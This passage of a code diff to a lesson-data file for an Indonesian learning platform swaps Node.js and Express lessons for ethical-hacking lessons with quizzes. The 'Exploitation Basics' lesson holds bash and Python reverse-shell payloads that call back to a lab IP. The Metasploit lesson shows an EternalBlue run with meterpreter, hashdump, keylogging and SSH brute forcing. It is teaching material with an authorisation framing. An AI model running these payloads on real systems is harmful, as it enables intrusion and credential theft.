-  console.log("Server berjalan di http://localhost:3000");
-});
-\`\`\`
-
-Jalankan dengan:
-
-\`\`\`bash
-node app.js
-\`\`\`
-
-## Module System (CommonJS vs ES Modules)
-
-\`\`\`javascript
-// CommonJS (default)
-const fs = require("fs");
-module.exports = { fungsi };
-
-// ES Modules (modern)
-import fs from "fs";
-export const fungsi = () => {};
-\`\`\`
-
-## Event Loop dan Non-blocking
-
-Node.js single-threaded tapi asynchronous. Operasi I/O (file, network) tidak blocking:
-
-\`\`\`javascript
-console.log("1");
-setTimeout(() => console.log("2"), 0);
-console.log("3");
-// Output: 1, 3, 2 (async tidak blocking)
-\`\`\`
-
-## Global Object di Node.js
-
-- \`__dirname\`: path folder file saat ini
-- \`__filename\`: path file saat ini
-- \`process\`: info proses Node
-- \`require()\`: import module
-- \`module\`: info module
-
-> **Best Practice:** Gunakan Node.js untuk aplikasi I/O-heavy (API, real-time). Hindari untuk CPU-intensive task (gambar processing berat).`,
+> Tanpa izin tertulis (Rules of Engagement / RoE), aktivitas "hacking" adalah kejahatan pidana. Etika adalah pondasi profesi ethical hacker.`,
     quiz: [
       {
-        question: "Apa engine yang menjadi dasar Node.js?",
-        options: ["SpiderMonkey", "V8", "JavaScriptCore", "Chakra"],
+        question: "Apa yang membedakan ethical hacker dengan black hat?",
+        options: ["Skill teknis", "Izin tertulis dari pemilik sistem", "Jenis tool", "Sistem operasi"],
         answer: 1,
-        explanation: "Node.js dibangun di atas V8 engine buatan Google (juga digunakan di Chrome)."
+        explanation: "Ethical hacker bekerja dengan izin tertulis dan tujuan meningkatkan keamanan, sementara black hat ilegal."
       },
       {
-        question: "Apa keunggulan utama model I/O Node.js?",
-        options: [
-          "Multi-threaded",
-          "Blocking I/O",
-          "Non-blocking I/O (asynchronous)",
-          "Hanya untuk Windows"
-        ],
+        question: "Pentest di mana tester tidak diberi info apapun?",
+        options: ["White Box", "Black Box", "Gray Box", "Red Box"],
+        answer: 1,
+        explanation: "Black box testing mensimulasikan penyerang eksternal tanpa pengetahuan internal tentang target."
+      },
+      {
+        question: "Tahap pertama metodologi PTES?",
+        options: ["Exploitation", "Reporting", "Pre-engagement Interactions", "Reconnaissance"],
         answer: 2,
-        explanation: "Node.js menggunakan non-blocking I/O yang asynchronous, sehingga efisien menangani banyak koneksi concurrent."
-      },
-      {
-        question: "Module system manakah yang menggunakan require() dan module.exports?",
-        options: ["ES Modules", "CommonJS", "AMD", "UMD"],
-        answer: 1,
-        explanation: "CommonJS menggunakan require() untuk import dan module.exports untuk export. ES Modules menggunakan import/export."
+        explanation: "Pre-engagement interactions adalah tahap awal di mana kontrak, scope, dan rules of engagement disepakati."
       }
     ]
   },
   {
     level: 5,
     order: 2,
-    title: "NPM",
-    slug: "npm",
-    description: "Mengenal NPM (Node Package Manager): install package, package.json, scripts, dan dependencies.",
-    icon: "📦",
+    title: "Information Gathering",
+    slug: "information-gathering",
+    description: "Fase reconnaissance - mengumpulkan info target sebelum serang.",
+    icon: "🕵️",
     isProject: false,
-    content: `# NPM (Node Package Manager)
+    content: `# Information Gathering
 
-**NPM** adalah package manager untuk Node.js. Dengan NPM, kamu bisa menginstal ribuan package open-source dan mengelola dependencies project.
+**Reconnaissance** atau information gathering adalah fase pertama dan paling penting dalam ethical hacking. Kualitas info yang terkumpul menentukan keberhasilan fase berikutnya. Dibagi menjadi **passive** (tanpa kontak langsung dengan target) dan **active** (interaksi langsung).
 
-## Inisialisasi Project
-
-\`\`\`bash
-# Buat package.json (jawab pertanyaan atau pakai flag -y)
-npm init -y
-\`\`\`
-
-File \`package.json\` berisi metadata project dan daftar dependencies.
-
-## Menginstal Package
+## Passive Recon
 
 \`\`\`bash
-# Install package (production dependency)
-npm install express
+# WHOIS - info registrasi domain
+whois example.com
 
-# Install sebagai dev dependency
-npm install --save-dev nodemon
+# DNS records
+dig ANY example.com
+dnsenum example.com
 
-# Install global (bisa diakses di mana saja)
-npm install -g nodemon
+# Search engine dorking
+# site:example.com filetype:pdf
+# intitle:"index of" "parent directory"
 
-# Install versi spesifik
-npm install express@4.18.0
+# Subdomain enumeration
+subfinder -d example.com -silent
+amass enum -d example.com
 \`\`\`
 
-## Struktur package.json
-
-\`\`\`json
-{
-  "name": "aplikasi-saya",
-  "version": "1.0.0",
-  "description": "Belajar NPM",
-  "main": "index.js",
-  "scripts": {
-    "start": "node index.js",
-    "dev": "nodemon index.js",
-    "test": "jest"
-  },
-  "dependencies": {
-    "express": "^4.18.0"
-  },
-  "devDependencies": {
-    "nodemon": "^3.0.0"
-  }
-}
-\`\`\`
-
-## NPM Scripts
+## Active Recon
 
 \`\`\`bash
-npm run start    # jalankan script "start"
-npm run dev      # jalankan script "dev"
-npm start        # shortcut untuk "start"
+# Network range discovery
+whois -h whois.radb.net -- '-i origin AS12345'
+
+# Ping sweep
+nmap -sn 10.10.10.0/24
+
+# Port scan dasar
+nmap -sS -sV -O 10.10.10.5
 \`\`\`
 
-## dependencies vs devDependencies
+## OSINT Tools
 
-- **dependencies**: package yang dibutuhkan saat production (express, mongoose)
-- **devDependencies**: package hanya untuk development (nodemon, jest, eslint)
-
-## Versioning (SemVer)
-
-Format: \`MAJOR.MINOR.PATCH\`
-
-- \`^4.18.0\`: update MINOR dan PATCH (4.x.x)
-- \`~4.18.0\`: update PATCH saja (4.18.x)
-- \`4.18.0\`: lock ke versi exact
-
-## Perintah Berguna
+\`\`\`text
+- theHarvester     : email, subdomain, employee
+- Maltego          : visual link analysis
+- Shodan           : search engine untuk perangkat IoT
+- Recon-ng         : framework modular OSINT
+- Google Dorks     : pencarian lanjutan
+- Wayback Machine  : arsip versi situs lama
+\`\`\`
 
 \`\`\`bash
-npm list                # lihat installed packages
-npm outdated            # cek package outdated
-npm update              # update package
-npm uninstall express   # hapus package
-npm install             # install semua dari package.json
+# theHarvester
+theHarvester -d example.com -b google,bing,linkedin
+
+# Shodan search
+shodan search "apache country:ID"
 \`\`\`
 
-> **Best Practice:** Selalu commit \`package.json\` dan \`package-lock.json\`, tapi jangan commit folder \`node_modules\` (tambahkan ke .gitignore).`,
+> Recon yang baik membuka 80% peluang eksploitasi. Luangkan waktu ekstra di fase ini — info presisi tentang target selalu lebih bernilai daripada ratusan exploit buta.`,
     quiz: [
       {
-        question: "Apa fungsi file package.json?",
-        options: [
-          "Menyimpan kode aplikasi",
-          "Metadata project dan daftar dependencies",
-          "Konfigurasi database",
-          "Menyimpan data user"
-        ],
+        question: "Perbedaan passive dan active reconnaissance?",
+        options: ["Passive pakai tools, active tidak", "Passive tanpa kontak langsung target, active ada interaksi", "Tidak ada beda", "Active lebih cepat"],
         answer: 1,
-        explanation: "package.json berisi metadata project (nama, versi) dan daftar dependencies yang dibutuhkan project."
+        explanation: "Passive recon tidak menghasilkan traffic langsung ke target, sedangkan active recon berinteraksi langsung."
       },
       {
-        question: "Apa perbedaan dependencies dan devDependencies?",
-        options: [
-          "dependencies untuk server, devDependencies untuk client",
-          "dependencies untuk production, devDependencies hanya untuk development",
-          "Tidak ada perbedaan",
-          "devDependencies lebih besar"
-        ],
+        question: "Tool untuk enumerasi subdomain?",
+        options: ["Wireshark", "Subfinder", "Nmap -sV", "John"],
         answer: 1,
-        explanation: "dependencies dibutuhkan di production. devDependencies hanya untuk development (testing, linting, hot reload)."
+        explanation: "Subfinder dan Amass adalah tool populer untuk menemukan subdomain target secara passive."
       },
       {
-        question: "Apa arti simbol ^ di depan versi package (^4.18.0)?",
-        options: [
-          "Lock ke versi exact",
-          "Boleh update MINOR dan PATCH",
-          "Boleh update MAJOR",
-          "Versi beta"
-        ],
+        question: "Search engine yang khusus untuk perangkat IoT?",
+        options: ["Google", "Shodan", "Bing", "DuckDuckGo"],
         answer: 1,
-        explanation: "Caret (^) memperbolehkan update MINOR dan PATCH (4.x.x) tapi tidak MAJOR, untuk hindari breaking changes."
+        explanation: "Shodan adalah search engine yang mengindeks perangkat terhubung internet (server, IoT, kamera)."
       }
     ]
   },
   {
     level: 5,
     order: 3,
-    title: "Express.js",
-    slug: "expressjs",
-    description: "Mengenal framework Express.js: setup server, middleware, routing dasar, dan struktur aplikasi.",
-    icon: "🚂",
+    title: "Scanning & Enumeration",
+    slug: "scanning-enumeration",
+    description: "Memindai port, service, dan enumerasi target.",
+    icon: "🔍",
     isProject: false,
-    content: `# Express.js
+    content: `# Scanning & Enumeration
 
-**Express.js** adalah framework web minimalis dan fleksibel untuk Node.js. Express memudahkan pembuatan API dan web server dengan routing, middleware, dan helper HTTP.
+Setelah recon, kita memasuki fase **scanning** untuk menemukan port terbuka, service, dan versi yang berjalan. **Enumeration** mendalami service yang ditemukan untuk mengumpulkan info lebih detail (user, share, banner).
 
-## Instalasi dan Setup
+## Port Scanning dengan Nmap
 
 \`\`\`bash
-mkdir aplikasi-saya
-cd aplikasi-saya
-npm init -y
-npm install express
+# TCP SYN scan (stealth) + versi service + OS detection
+nmap -sS -sV -O 10.10.10.5
+
+# Scan semua port
+nmap -p- 10.10.10.5
+
+# Scan via script NSE
+nmap -sC -sV 10.10.10.5
+
+# UDP scan (lambat)
+nmap -sU --top-ports 50 10.10.10.5
 \`\`\`
 
-## Hello World Server
+## Enumeration per Service
 
-\`\`\`javascript
-const express = require("express");
-const app = express();
-const PORT = 3000;
+\`\`\`bash
+# SMB enumeration
+enum4linux-ng -A 10.10.10.5
+smbclient -L //10.10.10.5 -N
 
-// Middleware parse JSON body
-app.use(express.json());
+# NFS
+showmount -e 10.10.10.5
 
-// Route GET /
-app.get("/", (req, res) => {
-  res.send("Halo Dunia!");
-});
+# SSH banner
+nc 10.10.10.5 22
 
-app.listen(PORT, () => {
-  console.log(\`Server berjalan di http://localhost:\${PORT}\`);
-});
+# HTTP directory
+gobuster dir -u http://10.10.10.5 -w common.txt -x php,txt
 \`\`\`
 
-## Middleware
+## Masscan untuk Jaringan Besar
 
-Middleware adalah function yang dipanggil sebelum request sampai ke handler. Express menggunakan **stack of middleware**.
-
-\`\`\`javascript
-// Logger middleware
-app.use((req, res, next) => {
-  console.log(\`\${req.method} \${req.url} - \${new Date().toISOString()}\`);
-  next(); // lanjut ke middleware/handler berikutnya
-});
-
-// Built-in middleware
-app.use(express.json());      // parse JSON body
-app.use(express.urlencoded({ extended: true })); // parse form data
-app.use(express.static("public")); // serve static files
+\`\`\`bash
+# Scan jaringan besar super cepat
+masscan -p1-65535 10.10.10.0/24 --rate=10000
 \`\`\`
 
-## Response Methods
+## Tips Optimasi
 
-\`\`\`javascript
-res.send("teks");              // kirim teks
-res.json({ nama: "Budi" });   // kirim JSON
-res.status(201).json(data);   // kirim dengan status code
-res.sendFile("/path/file");   // kirim file
-res.redirect("/login");       // redirect
+\`\`\`text
+- Mulai dari top-1000 ports, lalu -p- bila perlu
+- Gabungkan NSE script sesuai service
+- Catat versi service untuk cari exploit di Exploit-DB
+- Bandingkan banner dengan CVE database (searchsploit)
 \`\`\`
 
-## Struktur Project Recommended
-
-\`\`\`
-aplikasi-saya/
-├── src/
-│   ├── routes/
-│   ├── controllers/
-│   ├── models/
-│   ├── middleware/
-│   └── app.js
-├── package.json
-└── .env
-\`\`\`
-
-## Request Object
-
-\`\`\`javascript
-app.post("/users", (req, res) => {
-  console.log(req.body);      // data dari body (perlu express.json())
-  console.log(req.params);    // parameter URL /:id
-  console.log(req.query);     // query string ?key=value
-  console.log(req.headers);   // HTTP headers
-});
-\`\`\`
-
-> **Best Practice:** Pisahkan routes, controllers, dan middleware ke file terpisah untuk maintainability. Gunakan \`express.json()\` untuk parse body.`,
+> Enumeration adalah seni. Service yang sama bisa membuka banyak pintu — SMB share anonim, FTP anonymous, atau default credentials SNMP sering kali membuka jalan masuk awal.`,
     quiz: [
       {
-        question: "Apa fungsi middleware di Express.js?",
-        options: [
-          "Menggambar UI",
-          "Function yang dipanggil antara request dan response",
-          "Menyimpan database",
-          "Mengkompilasi JavaScript"
-        ],
+        question: "Flag Nmap untuk deteksi versi service?",
+        options: ["-O", "-sV", "-sU", "-Pn"],
         answer: 1,
-        explanation: "Middleware adalah function yang dijalankan antara menerima request dan mengirim response. Bisa logging, auth, parse body, dll."
+        explanation: "Flag -sV melakukan version detection pada service yang berjalan di port terbuka."
       },
       {
-        question: "Method apa untuk parse JSON body di Express?",
-        options: ["express.parse()", "express.json()", "bodyParser()", "app.parse()"],
-        answer: 1,
-        explanation: "express.json() adalah built-in middleware untuk parse body berformat JSON sebelum tersedia di req.body."
+        question: "Tool untuk enumerasi SMB?",
+        options: ["enum4linux-ng", "sqlmap", "John", "Hydra"],
+        answer: 0,
+        explanation: "enum4linux-ng adalah tool enumerasi SMB/NetBIOS yang mengumpulkan info user, share, dan password policy."
       },
       {
-        question: "Apa fungsi next() dalam middleware?",
-        options: [
-          "Lompat ke route berikutnya",
-          "Lanjut ke middleware/handler berikutnya",
-          "Menghentikan request",
-          "Mengirim response"
-        ],
+        question: "Masscan digunakan untuk?",
+        options: ["Brute force password", "Scan port super cepat di jaringan besar", "Enkripsi", "Backup"],
         answer: 1,
-        explanation: "next() memanggil middleware atau handler berikutnya dalam stack. Tanpa next() atau res, request akan hang."
+        explanation: "Masscan adalah port scanner super cepat yang dirancang untuk memindai jaringan besar dalam waktu singkat."
       }
     ]
   },
   {
     level: 5,
     order: 4,
-    title: "Routing",
-    slug: "routing",
-    description: "Memahami routing di Express: HTTP methods, route parameters, query string, dan router modular.",
-    icon: "🛣️",
+    title: "Vulnerability Assessment",
+    slug: "vulnerability-assessment",
+    description: "Mengidentifikasi dan menganalisis kerentanan sistem.",
+    icon: "⚠️",
     isProject: false,
-    content: `# Routing di Express.js
+    content: `# Vulnerability Assessment
 
-**Routing** menentukan bagaimana aplikasi merespons request ke endpoint tertentu. Setiap route memiliki **method HTTP**, **path**, dan **handler**.
+**Vulnerability Assessment (VA)** adalah proses sistematis untuk mengidentifikasi, mengkuantifikasi, dan memprioritaskan kerentanan pada sistem. Berbeda dengan pentest, VA fokus pada penemuan, bukan eksploitasi.
 
-## Route Dasar
+## Jenis Assessment
 
-\`\`\`javascript
-app.METHOD(PATH, HANDLER);
+1. **Network-based** — scan host, port, service.
+2. **Host-based** — scan OS, patch level, konfigurasi.
+3. **Application-based** — scan kode & dependency.
+4. **Database-based** — audit hak akses & enkripsi.
 
-// Contoh
-app.get("/", (req, res) => res.send("GET /"));
-app.post("/users", (req, res) => res.send("POST /users"));
-app.put("/users/:id", (req, res) => res.send("PUT /users"));
-app.delete("/users/:id", (req, res) => res.send("DELETE /users"));
+## Tools Utama
+
+\`\`\`bash
+# Nessus / OpenVAS - scanner enterprise
+openvas-start
+# Buka https://127.0.0.1:9392
+
+# Nmap NSE vulnerability scripts
+nmap --script vuln 10.10.10.5
+
+# Nikto - web server scanner
+nikto -h http://10.10.10.5
+
+# Search exploit berdasar versi
+searchsploit apache 2.4.49
 \`\`\`
 
-## Route Parameters
+## Klasifikasi CVSS
 
-\`\`\`javascript
-// URL: /users/123
-app.get("/users/:id", (req, res) => {
-  const id = req.params.id; // "123"
-  res.json({ id: id });
-});
-
-// Multiple params: /users/123/posts/45
-app.get("/users/:userId/posts/:postId", (req, res) => {
-  console.log(req.params.userId);   // "123"
-  console.log(req.params.postId);   // "45"
-});
+\`\`\`text
+Score Range  Severity
+0.0  - 3.9   Low
+4.0  - 6.9   Medium
+7.0  - 8.9   High
+9.0  - 10.0  Critical
 \`\`\`
 
-## Query String
-
-\`\`\`javascript
-// URL: /search?q=nodejs&page=2
-app.get("/search", (req, res) => {
-  const q = req.query.q;        // "nodejs"
-  const page = req.query.page;  // "2"
-  res.json({ q, page });
-});
+\`\`\`bash
+# Cek CVE detail
+curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-41773" | jq
 \`\`\`
 
-## Multiple Handlers (Middleware Route)
+## Workflow
 
-\`\`\`javascript
-app.get("/admin", 
-  (req, res, next) => {
-    // auth check
-    if (!req.headers.authorization) {
-      return res.status(401).send("Unauthorized");
-    }
-    next();
-  },
-  (req, res) => {
-    res.send("Admin Dashboard");
-  }
-);
+\`\`\`text
+1. Asset discovery (apa yang akan di-scan)
+2. Scan otomatis (Nessus, OpenVAS, Nmap)
+3. Validasi manual (hilangkan false positive)
+4. Risk scoring (CVSS + business impact)
+5. Prioritisasi remediasi
+6. Re-scan untuk verifikasi
 \`\`\`
 
-## Express Router (Modular Routes)
-
-Pisahkan routes ke file terpisah untuk maintainability:
-
-\`\`\`javascript
-// routes/users.js
-const router = require("express").Router();
-
-router.get("/", (req, res) => res.send("List users"));
-router.get("/:id", (req, res) => res.send("User " + req.params.id));
-router.post("/", (req, res) => res.send("Create user"));
-
-module.exports = router;
-
-// app.js
-const usersRoute = require("./routes/users");
-app.use("/users", usersRoute); // prefix /users
-\`\`\`
-
-## Response dengan Status Code
-
-\`\`\`javascript
-app.get("/users/:id", (req, res) => {
-  const user = findUser(req.params.id);
-  if (!user) return res.status(404).json({ error: "User tidak ditemukan" });
-  res.status(200).json(user);
-});
-\`\`\`
-
-> **Best Practice:** Gunakan \`express.Router()\` untuk memecah routes berdasarkan resource (users, posts, products). Ini membuat kode lebih terorganisir.`,
+> VA adalah langkah proaktif. Lakukan secara berkala (bulanan/kuartalan) untuk menjaga postur keamanan, dan jangan terjebak hanya pada score CVSS — pertimbangkan juga business context.`,
     quiz: [
       {
-        question: "Bagaimana cara mengakses parameter URL /users/:id?",
-        options: ["req.params.id", "req.query.id", "req.body.id", "req.url.id"],
+        question: "Perbedaan VA dengan pentest?",
+        options: ["VA fokus eksploitasi", "VA fokus identifikasi, pentest fokus eksploitasi", "Sama saja", "Pentest hanya scan"],
+        answer: 1,
+        explanation: "VA fokus pada penemuan & klasifikasi kerentanan, sementara pentest melangkah lebih jauh ke eksploitasi untuk konfirmasi."
+      },
+      {
+        question: "Score CVSS termasuk Critical bila?",
+        options: ["0-3.9", "4-6.9", "7-8.9", "9-10"],
+        answer: 3,
+        explanation: "Score CVSS 9.0-10.0 diklasifikasikan sebagai Critical severity."
+      },
+      {
+        question: "Tool scanner vulnerability open-source populer?",
+        options: ["OpenVAS", "Photoshop", "Word", "Excel"],
         answer: 0,
-        explanation: "Route parameters (dengan :id) diakses via req.params.id. req.query untuk query string, req.body untuk data POST."
-      },
-      {
-        question: "URL /search?q=node&page=2, bagaimana akses q dan page?",
-        options: [
-          "req.params.q dan req.params.page",
-          "req.query.q dan req.query.page",
-          "req.body.q dan req.body.page",
-          "req.search.q"
-        ],
-        answer: 1,
-        explanation: "Query string (setelah ?) diakses via req.query. req.query.q = 'node', req.query.page = '2'."
-      },
-      {
-        question: "Apa fungsi express.Router()?",
-        options: [
-          "Membuat route baru",
-          "Modularisasi routes ke file terpisah",
-          "Menghapus route",
-          "Mengirim response"
-        ],
-        answer: 1,
-        explanation: "express.Router() membuat instance router modular yang bisa dipasang di app dengan app.use('/prefix', router)."
+        explanation: "OpenVAS (sekarang Greenbone) adalah vulnerability scanner open-source yang setara dengan Nessus."
       }
     ]
   },
   {
     level: 5,
     order: 5,
-    title: "REST API",
-    slug: "rest-api",
-    description: "Mempelajari prinsip REST API: HTTP methods, status codes, dan konvensi penamaan endpoint.",
-    icon: "🔌",
+    title: "Exploitation Basics",
+    slug: "exploitation-basics",
+    description: "Dasar-dasar mengeksploitasi kerentanan yang ditemukan.",
+    icon: "💥",
     isProject: false,
-    content: `# REST API
+    content: `# Exploitation Basics
 
-**REST** (Representational State Transfer) adalah arsitektur untuk membangun web API. REST menggunakan **HTTP methods** untuk operasi **CRUD** (Create, Read, Update, Delete).
+**Exploitation** adalah fase di mana kita memanfaatkan kerentanan yang telah diidentifikasi untuk mendapatkan akses, eksekusi kode, atau eskalasi privilege. Tujuannya membuktikan impact kerentanan secara nyata.
 
-## HTTP Methods dan CRUD
+## Jenis Exploit
 
-| Method | Operasi | Contoh Endpoint | Deskripsi |
-|--------|---------|----------------|-----------|
-| GET    | Read    | GET /users     | Ambil semua user |
-| POST   | Create  | POST /users    | Buat user baru |
-| GET    | Read    | GET /users/:id | Ambil user by ID |
-| PUT    | Update  | PUT /users/:id | Update full user |
-| PATCH  | Update  | PATCH /users/:id| Update partial |
-| DELETE | Delete  | DELETE /users/:id | Hapus user |
+- **Remote Code Execution (RCE)** — eksekusi perintah dari jarak jauh.
+- **Local Privilege Escalation (LPE)** — naik dari user biasa ke root/admin.
+- **Denial of Service (DoS)** — crash atau overload service.
+- **Information Disclosure** — baca data tanpa akses.
 
-## Contoh REST API dengan Express
+## Sumber Exploit
 
-\`\`\`javascript
-let users = [
-  { id: 1, nama: "Budi" },
-  { id: 2, nama: "Andi" }
-];
+\`\`\`bash
+# Searchsploit - database lokal Exploit-DB
+searchsploit "Apache 2.4.49"
+searchsploit -m 41773   # mirror exploit ke folder kerja
 
-// GET semua users
-app.get("/api/users", (req, res) => {
-  res.json(users);
-});
+# Exploit-DB online
+# https://www.exploit-db.com
 
-// GET user by ID
-app.get("/api/users/:id", (req, res) => {
-  const user = users.find(u => u.id === parseInt(req.params.id));
-  if (!user) return res.status(404).json({ error: "User tidak ditemukan" });
-  res.json(user);
-});
-
-// POST buat user baru
-app.post("/api/users", (req, res) => {
-  const user = { id: users.length + 1, nama: req.body.nama };
-  users.push(user);
-  res.status(201).json(user);
-});
-
-// PUT update user
-app.put("/api/users/:id", (req, res) => {
-  const user = users.find(u => u.id === parseInt(req.params.id));
-  if (!user) return res.status(404).json({ error: "User tidak ditemukan" });
-  user.nama = req.body.nama;
-  res.json(user);
-});
-
-// DELETE user
-app.delete("/api/users/:id", (req, res) => {
-  users = users.filter(u => u.id !== parseInt(req.params.id));
-  res.status(204).send();
-});
+# GitHub / PacketStorm / CVE database
 \`\`\`
 
-## Status Code Penting
+## Contoh Reverse Shell
 
-- **200 OK**: request berhasil
-- **201 Created**: resource berhasil dibuat
-- **204 No Content**: berhasil tanpa body (DELETE)
-- **400 Bad Request**: input invalid
-- **401 Unauthorized**: belum login
-- **403 Forbidden**: tidak punya akses
-- **404 Not Found**: resource tidak ada
-- **500 Internal Server Error**: error server
+\`\`\`bash
+# Listener di mesin attacker
+nc -lvnp 4444
 
-## Konvensi REST
+# Payload di mesin target (via RCE)
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
 
-- Gunakan **plural nouns**: \`/users\` bukan \`/user\`
-- **Versioning**: \`/api/v1/users\`
-- **Filtering via query**: \`/users?role=admin\`
-- **Nested resource**: \`/users/:id/posts\`
-- **HATEOAS** (opsional): sertakan link ke resource terkait
-
-## Response Format Konsisten
-
-\`\`\`javascript
-// Sukses
-{
-  "success": true,
-  "data": { ... },
-  "message": "User berhasil dibuat"
-}
-
-// Error
-{
-  "success": false,
-  "error": "User tidak ditemukan",
-  "code": "USER_NOT_FOUND"
-}
+# Python reverse shell
+python3 -c 'import socket,subprocess,os; \\
+  s=socket.socket(); s.connect(("10.10.14.5",4444)); \\
+  [os.dup2(s.fileno(),f) for f in (0,1,2)]; \\
+  subprocess.call(["/bin/bash","-i"])'
 \`\`\`
 
-> **Best Practice:** Selalu kembalikan status code yang tepat dan format response konsisten di semua endpoint.`,
+## Pwn Tools
+
+\`\`\`python
+from pwn import *
+
+# Buffer overflow basic
+p = remote("10.10.10.5", 1337)
+payload = b"A" * 200          # offset ke EIP
+payload += b"\\xef\\xbe\\xad\\xde"   # alamat return
+p.sendline(payload)
+p.interactive()
+\`\`\`
+
+\`\`\`text
+- Selalu uji exploit di lab sebelum ke target produksi
+- Pahami payload sebelum menjalankan (jangan asal run)
+- Catat timeline & perintah untuk laporan
+- Bersihkan backdoor setelah testing selesai
+\`\`\`
+
+> Eksploitasi butuh tanggung jawab. Satu perintah salah bisa menyebabkan downtime. Uji di lab, pahami payload, dan dokumentasikan setiap langkah.`,
     quiz: [
       {
-        question: "HTTP method manakah untuk membuat resource baru?",
-        options: ["GET", "POST", "PUT", "DELETE"],
+        question: "Jenis exploit untuk eksekusi perintah jarak jauh?",
+        options: ["DoS", "RCE", "LPE", "XSS"],
         answer: 1,
-        explanation: "POST digunakan untuk membuat resource baru. PUT untuk update full, PATCH untuk update partial, DELETE untuk hapus."
+        explanation: "Remote Code Execution (RCE) memungkinkan penyerang menjalankan perintah di mesin target dari jarak jauh."
       },
       {
-        question: "Status code manakah yang tepat saat resource berhasil dibuat?",
-        options: ["200", "201", "204", "400"],
-        answer: 1,
-        explanation: "201 Created menandakan resource baru berhasil dibuat. 200 untuk request sukses umum, 204 untuk sukses tanpa body."
+        question: "Database exploit paling populer untuk pencarian?",
+        options: ["Exploit-DB (searchsploit)", "Wikipedia", "Google Images", "Stack Overflow"],
+        answer: 0,
+        explanation: "Exploit-DB dengan CLI searchsploit adalah sumber exploit publik paling banyak digunakan pentester."
       },
       {
-        question: "Endpoint manakah yang mengikuti konvensi REST dengan benar?",
-        options: ["/getUser", "/users/:id", "/api/getUserById/5", "/delete-user"],
-        answer: 1,
-        explanation: "REST menggunakan plural nouns dan HTTP method untuk operasi: /users/:id. Hindari kata kerja di URL."
+        question: "Perintah listener reverse shell dengan netcat?",
+        options: ["nc -lvnp 4444", "nc 10.0.0.1 80", "ping host", "ifconfig"],
+        answer: 0,
+        explanation: "nc -lvnp 4444 membuka listener di port 4444 untuk menerima koneksi balik dari target."
       }
     ]
   },
   {
     level: 5,
     order: 6,
-    title: "Authentication (JWT)",
-    slug: "auth-jwt",
-    description: "Implementasi autentikasi dengan JSON Web Token: login, generate token, dan verifikasi middleware.",
-    icon: "🔐",
+    title: "Metasploit Framework",
+    slug: "metasploit-framework",
+    description: "Tool eksploitasi paling populer untuk pentester.",
+    icon: "🚀",
     isProject: false,
-    content: `# Authentication dengan JWT
+    content: `# Metasploit Framework
 
-**JWT (JSON Web Token)** adalah standar untuk autentikasi stateless. Setelah login, server memberi **token** yang dikirim client di setiap request berikutnya.
+**Metasploit Framework (MSF)** adalah platform eksploitasi open-source paling populer, berisi ribuan exploit, payload, encoder, dan auxiliary module. Dikembangkan oleh Rapid7 dan menjadi standar industri untuk pentest.
 
-## Cara Kerja JWT
+## Arsitektur MSF
 
-1. User **login** dengan email & password
-2. Server **verifikasi** kredensial
-3. Server **generate JWT** dan kirim ke client
-4. Client simpan token (localStorage/cookie)
-5. Setiap request, client kirim token di header \`Authorization: Bearer <token>\`
-6. Server **verifikasi token** di middleware
+- **Exploit** — kode yang memanfaatkan kerentanan.
+- **Payload** — apa yang dieksekusi setelah exploit (mis. meterpreter).
+- **Encoder** — obfuscasi payload untuk bypass AV.
+- **Auxiliary** — scanner, fuzzer, brute forcer.
+- **Post** — modul post-exploitation.
 
-## Instalasi
+## Workflow Dasar
 
 \`\`\`bash
-npm install jsonwebtoken bcrypt
+# Mulai console
+msfconsole
+
+# Cari exploit
+msf6 > search eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 (exploit) > show options
+msf6 (exploit) > set RHOSTS 10.10.10.5
+msf6 (exploit) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 (exploit) > set LHOST 10.10.14.5
+msf6 (exploit) > exploit
 \`\`\`
 
-## Login dan Generate Token
+## Meterpreter — Post Exploitation
 
-\`\`\`javascript
-const jwt = require("jsonwebtoken");
-const bcrypt = require("bcrypt");
-const SECRET_KEY = "rahasia-sangat-aman";
-
-app.post("/api/login", async (req, res) => {
-  const { email, password } = req.body;
-
-  // Cari user di database
-  const user = users.find(u => u.email === email);
-  if (!user) return res.status(401).json({ error: "Email salah" });
-
-  // Verifikasi password
-  const valid = await bcrypt.compare(password, user.password);
-  if (!valid) return res.status(401).json({ error: "Password salah" });
-
-  // Generate JWT
-  const token = jwt.sign(
-    { id: user.id, email: user.email },
-    SECRET_KEY,
-    { expiresIn: "1h" }
-  );
-
-  res.json({ token });
-});
+\`\`\`text
+meterpreter> sysinfo
+meterpreter> getuid
+meterpreter> hashdump
+meterpreter> screenshot
+meterpreter> keyscan_start
+meterpreter> migrate <PID>
+meterpreter> upload / download
 \`\`\`
 
-## Middleware Verifikasi Token
+## Auxiliary Modules
 
-\`\`\`javascript
-function authMiddleware(req, res, next) {
-  const authHeader = req.headers.authorization;
-  // Format: "Bearer <token>"
-  const token = authHeader && authHeader.split(" ")[1];
+\`\`\`bash
+# Port scan
+use auxiliary/scanner/portscan/tcp
 
-  if (!token) return res.status(401).json({ error: "Token tidak ada" });
+# SMB version scan
+use auxiliary/scanner/smb/smb_version
 
-  try {
-    const decoded = jwt.verify(token, SECRET_KEY);
-    req.user = decoded; // simpan info user di req
-    next();
-  } catch (err) {
-    return res.status(403).json({ error: "Token invalid" });
-  }
-}
-
-// Gunakan di route yang butuh auth
-app.get("/api/profile", authMiddleware, (req, res) => {
-  res.json({ message: "Halo user " + req.user.email });
-});
+# SSH brute force
+use auxiliary/scanner/ssh/ssh_login
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/rockyou.txt
 \`\`\`
 
-## Hash Password dengan bcrypt
+## Database & Workspace
 
-\`\`\`javascript
-// Saat register
-const salt = await bcrypt.genSalt(10);
-const hashedPassword = await bcrypt.hash(password, salt);
-
-// Saat login - compare
-const isValid = await bcrypt.compare(inputPassword, hashedPassword);
+\`\`\`bash
+msf6 > db_status
+msf6 > workspace -a project_x
+msf6 > hosts
+msf6 > services
+msf6 > creds
 \`\`\`
 
-## Struktur JWT
-
-JWT terdiri dari 3 bagian: \`header.payload.signature\`
-
-- **Header**: algoritma (HS256) dan tipe (JWT)
-- **Payload**: data user (id, email, role, exp)
-- **Signature**: verifikasi token tidak diubah
-
-> **Best Practice:** Jangan simpan data sensitif di payload JWT (tidak dienkripsi). Simpan JWT di **httpOnly cookie** untuk keamanan ekstra terhadap XSS.`,
